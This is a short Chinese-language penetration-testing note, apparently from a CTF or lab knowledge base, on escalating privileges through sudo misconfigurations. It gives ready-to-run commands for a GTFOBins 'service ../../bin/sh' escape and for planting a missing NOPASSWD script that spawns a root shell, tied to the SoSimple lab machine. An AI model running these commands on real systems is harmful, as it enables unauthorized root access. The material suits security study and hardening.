# Sudo 權限配置錯誤與利用 (sudo-l)
本文件說明如何利用 `sudo -l` (Sudoers 檔) 的配置錯誤進行本地權限提升（Privilege Escalation）。

---

## 💥 Sudo Service 提權
當使用者被授權可以免密碼以其他使用者（或 `root`）權限執行 `/usr/sbin/service` 命令時，可以利用 GTFOBins 逃逸技巧，執行相對路徑引導至互動式 Shell。

*   **漏洞檢測**：
    ```bash
    sudo -l
    # 輸出中包含：(username) NOPASSWD: /usr/sbin/service
    ```
*   **利用指令**：
    ```bash
    sudo -u <username> /usr/sbin/service ../../bin/bash
    
    # 或是直接提權為 root
    sudo /usr/sbin/service ../../bin/sh
    ```
    這會繞過 `service` 原本的監控機制，直接以目標使用者身份產出一個互動式 Shell。

---

## 💥 不存在腳本路徑的 Sudo 提權
當系統的 `sudoers` 檔案授權某個使用者可以免密碼以 `root` 執行某個腳本，但是該腳本所指的目錄或檔案目前**並不存在**於系統中。如果普通使用者對該腳本的父目錄擁有寫入權限，即可自行建立該腳本以執行任意代碼。

*   **漏洞檢測**：
    ```bash
    sudo -l
    # 輸出中包含：(root) NOPASSWD: /opt/tools/server-health.sh
    ```
    如果 `/opt/tools/server-health.sh` 不存在，且使用者可寫入 `/opt/`。
*   **利用指令**：
    1.  **建立缺失的目錄與腳本**：
        ```bash
        mkdir -p /opt/tools
        echo -e '#!/bin/bash\n/bin/bash -p' > /opt/tools/server-health.sh
        chmod +x /opt/tools/server-health.sh
        ```
    2.  **以 Root 執行 Sudo 提權**：
        ```bash
        sudo /opt/tools/server-health.sh
        ```
        系統執行該腳本後即可成功取得具備 `root` 權限的 Shell。

---

# 實戰關聯
*   **靶機應用實例**：[[SoSimple]]（利用 `sudo -u steven service ../../bin/bash` 切換使用者；隨後利用不存在的 `/opt/tools/server-health.sh` 腳本取得 `root` 權限）。
